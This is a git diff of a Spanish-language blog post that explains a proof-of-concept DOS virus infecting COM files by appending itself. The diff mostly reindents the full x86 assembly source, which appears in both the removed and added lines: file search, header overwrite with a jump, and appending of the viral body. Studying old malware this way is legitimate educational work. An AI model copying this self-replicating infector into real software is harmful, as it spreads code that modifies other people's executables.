@@ -18,7 +18,7 @@ Durante la infección, el virus reemplaza los primeros bytes del archivo huéspe
 de ejecución hacia el final del archivo donde se añade el cuerpo viral. El cabezal 
 original reemplazado es guardado en el cuerpo viral.
 
-![infection](/assets/images/poc-virus-x86dos-com-postpending/infection.png){:width="450"}
+{% img infection.png | {"width":"450"} %}
 
 Cuando un archivo infectado es ejecutado, el virus se carga en memoria junto con este y se 
 ejecuta primero realizando sus propias acciones, al terminar restaura el cabezal original
@@ -56,7 +56,8 @@ directorio actual a excepción de aquellos con atributo READ-ONLY, HIDDEN o SYST
   ubicación default de la DTA.
 
 ## Flujo de ejecución
-![flow](/assets/images/poc-virus-x86dos-com-postpending/flow.png){:width="400"}
+
+{% img flow.png | {"width":"400"} %}
 
 ## Análisis estático
 
@@ -208,105 +209,115 @@ Se utilizan 8 servicios de la DOS API mediante la interrupción de software 21h.
 ;# Stealth:       No  
 ;# Payload:       No  
 ;##############################################################################
-                .8086  
-                .model tiny
 
-                assume cs:virus, ds:virus
+.8086  
+.model tiny
 
-       virus    segment byte public 'CODE'
+assume cs:virus, ds:virus
 
-                org 100h
-      start:    jmp short body                        ; cabezal, en las siguientes generaciones aquí  
-                nop                                   ; habrá un near JMP de 3 bytes
+virus segment byte public 'CODE'
 
-                mov ah, 00h                           ; / huésped dummy, solo retorna a DOS  
-                int 21h                               ; \
-            
-       body:    call d_offset                         ; calcular delta offset  
-   d_offset:    pop bp  
-                sub bp, offset d_offset 
+    org 100h
+
+start:    
+    jmp short body                        ; cabezal, en las siguientes generaciones aquí  
+    nop                                   ; habrá un near JMP de 3 bytes
+    
+    mov ah, 00h                           ; / huésped dummy, solo retorna a DOS  
+    int 21h                               ; \
+
+body:    
+    call d_offset                         ; calcular delta offset  
+
+d_offset:    
+    pop bp  
+    sub bp, offset d_offset 
                 
-                mov cx, 3                             ; restaurar cabezal original  
-                lea si, [bp + host_head]  
-                mov di, 100h  
-                rep movsb
-                
-                mov ah, 4Eh                           ; | AH = 4Eh  
-                xor cx, cx                            ; | CX = 0, archivos normales  
-                lea dx, [bp + search_str]             ; | DS:DX -> "*.COM"  
-                int 21h                               ; |_DOS API - Buscar primer archivo
-                
-                jnc infect_file                       ; archivo encontrado  
-                jmp exit                              ; no hay archivo
+    mov cx, 3                             ; restaurar cabezal original  
+    lea si, [bp + host_head]  
+    mov di, 100h  
+    rep movsb
+    
+    mov ah, 4Eh                           ; | AH = 4Eh  
+    xor cx, cx                            ; | CX = 0, archivos normales  
+    lea dx, [bp + search_str]             ; | DS:DX -> "*.COM"  
+    int 21h                               ; |_DOS API - Buscar primer archivo
+    
+    jnc infect_file                       ; archivo encontrado  
+    jmp exit                              ; no hay archivo
 
-  find_next:    mov ah, 4Fh                           ; | AH = 4Fh  
-                int 21h                               ; |_DOS API - Buscar siguiente archivo 
+find_next:    
+    mov ah, 4Fh                           ; | AH = 4Fh  
+    int 21h                               ; |_DOS API - Buscar siguiente archivo 
 
-                jc exit                               ; no hay archivo
+    jc exit                               ; no hay archivo
 
-infect_file:    mov ah, 3Dh                           ; | AH = 3Dh  
-                mov al, 2                             ; | AL = 2, lectura y escritura  
-                mov dx, 9Eh                           ; | DS:DX -> DTA + 1Eh = 9Eh (FileName)  
-                int 21h                               ; |_DOS API - Abrir archivo existente
+infect_file:   
+    mov ah, 3Dh                           ; | AH = 3Dh  
+    mov al, 2                             ; | AL = 2, lectura y escritura  
+    mov dx, 9Eh                           ; | DS:DX -> DTA + 1Eh = 9Eh (FileName)  
+    int 21h                               ; |_DOS API - Abrir archivo existente
 
-                jc find_next                          ; no se puede abrir archivo, buscar siguiente archivo  
-                push ax                               ; guardar handle y continuar infección
-                  
-                mov ah, 3Fh                           ; | AH = 3Fh  
-                pop bx                                ; | BX = handle del archivo  
-                mov cx, 3                             ; | CX = tamaño del cabezal, 3 bytes  
-                lea dx, [bp + host_head]              ; | DS:DX -> destino: buffer para cabezal original  
-                int 21h                               ; |_DOS API - Leer de archivo/dispositivo
-                  
-                jc close_file                         ; no se puede leer el archivo, cerrarlo
+    jc find_next                          ; no se puede abrir archivo, buscar siguiente archivo  
+    push ax                               ; guardar handle y continuar infección
+      
+    mov ah, 3Fh                           ; | AH = 3Fh  
+    pop bx                                ; | BX = handle del archivo  
+    mov cx, 3                             ; | CX = tamaño del cabezal, 3 bytes  
+    lea dx, [bp + host_head]              ; | DS:DX -> destino: buffer para cabezal original  
+    int 21h                               ; |_DOS API - Leer de archivo/dispositivo
+      
+    jc close_file                         ; no se puede leer el archivo, cerrarlo
 
-                mov ax, 4200h                         ; | AX = 4200h (principio del archivo)  
-                xor cx, cx                            ; | CX = 0  
-                xor dx, dx                            ; | DX = 0  
-                int 21h                               ; |_DOS API - Establecer puntero en archivo 
-                
-                jc close_file                         ; no se puede trabajar con el archivo, cerrarlo
-                
-                mov ax, word ptr [ds:9Ah]             ; calcular el largo del JMP para el cabezal viral, DTA+1Ah=9Ah (FileSize)  
-                sub ax, 3                             ; restarle 3 bytes del near JMP
-                
-                mov byte ptr [bp + tmp_head], 0E9h    ; construir cabezal viral en buffer temporal (E9h = near JMP)  
-                mov word ptr [bp + tmp_head + 1], ax
-                
-                mov ah, 40h                           ; | AH = 40h  
-                mov cx, 3                             ; | CX = tamaño del cabezal, 3 bytes  
-                lea dx, [bp + tmp_head]               ; | DS:DX -> origen: buffer temporal para cabezal viral  
-                int 21h                               ; |_DOS API - Escribir en archivo/dispositivo 
-                
-                jc close_file                         ; no se puede trabajar con el archivo, cerrarlo
-                
-                mov ax, 4202h                         ; | AX = 4202h (fin del archivo)  
-                xor cx, cx                            ; | CX = 0  
-                xor dx, dx                            ; | DX = 0  
-                int 21h                               ; |_DOS API - Establecer puntero en archivo 
-                
-                jc close_file                         ; no se puede trabajar con el archivo, cerrarlo
-                
-                mov ah, 40h                           ; | AH = 40h  
-                mov cx, virus_size                    ; | CX = tamaño del virus  
-                lea dx, [bp + body]                   ; | DS:DX -> origen: inicio del código viral  
-                int 21h                               ; |_DOS API - Escribir en archivo/dispositivo
+    mov ax, 4200h                         ; | AX = 4200h (principio del archivo)  
+    xor cx, cx                            ; | CX = 0  
+    xor dx, dx                            ; | DX = 0  
+    int 21h                               ; |_DOS API - Establecer puntero en archivo 
+    
+    jc close_file                         ; no se puede trabajar con el archivo, cerrarlo
+    
+    mov ax, word ptr [ds:9Ah]             ; calcular el largo del JMP para el cabezal viral, DTA+1Ah=9Ah (FileSize)  
+    sub ax, 3                             ; restarle 3 bytes del near JMP
+    
+    mov byte ptr [bp + tmp_head], 0E9h    ; construir cabezal viral en buffer temporal (E9h = near JMP)  
+    mov word ptr [bp + tmp_head + 1], ax
+    
+    mov ah, 40h                           ; | AH = 40h  
+    mov cx, 3                             ; | CX = tamaño del cabezal, 3 bytes  
+    lea dx, [bp + tmp_head]               ; | DS:DX -> origen: buffer temporal para cabezal viral  
+    int 21h                               ; |_DOS API - Escribir en archivo/dispositivo 
+    
+    jc close_file                         ; no se puede trabajar con el archivo, cerrarlo
+    
+    mov ax, 4202h                         ; | AX = 4202h (fin del archivo)  
+    xor cx, cx                            ; | CX = 0  
+    xor dx, dx                            ; | DX = 0  
+    int 21h                               ; |_DOS API - Establecer puntero en archivo 
+    
+    jc close_file                         ; no se puede trabajar con el archivo, cerrarlo
+    
+    mov ah, 40h                           ; | AH = 40h  
+    mov cx, VIRUS_SIZE                    ; | CX = tamaño del virus  
+    lea dx, [bp + body]                   ; | DS:DX -> origen: inicio del código viral  
+    int 21h                               ; |_DOS API - Escribir en archivo/dispositivo
 
- close_file:    mov ah, 3Eh                           ; | AH = 3Eh  
-                int 21h                               ; |_DOS API - Cerrar archivo
+close_file:   
+    mov ah, 3Eh                           ; | AH = 3Eh  
+    int 21h                               ; |_DOS API - Cerrar archivo
 
-                jnc find_next                         ; si CF=0, buscar siguiente archivo 
+    jnc find_next                         ; si CF=0, buscar siguiente archivo 
 
-       exit:    mov cx, 0100h  
-                jmp cx                                ; saltar a CS:0100 y ejecutar huésped
+exit:   
+    mov cx, 0100h  
+    jmp cx                                ; saltar a CS:0100 y ejecutar huésped
 
-  search_str    db "*.com", 00h                       ; nombre comodín de búsqueda  
-   host_head    db 90h, 90h, 90h                      ; buffer para cabezal original  
-  virus_size    equ ($ - body)                        ; tamaño del virus  
-    tmp_head    db 3 dup (?)                          ; buffer temporal para el cabezal viral
+search_str    db   "*.COM", 00h           ; nombre comodín de búsqueda  
+host_head     db   90h, 90h, 90h          ; buffer para cabezal original  
+VIRUS_SIZE    equ  ($ - body)             ; tamaño del virus  
+tmp_head      db   3 dup (?)              ; buffer temporal para el cabezal viral
 
-       virus    ends  
-         end    start  
+virus ends  
+end start  
 {% endhighlight %}
 
 ## Casos reales
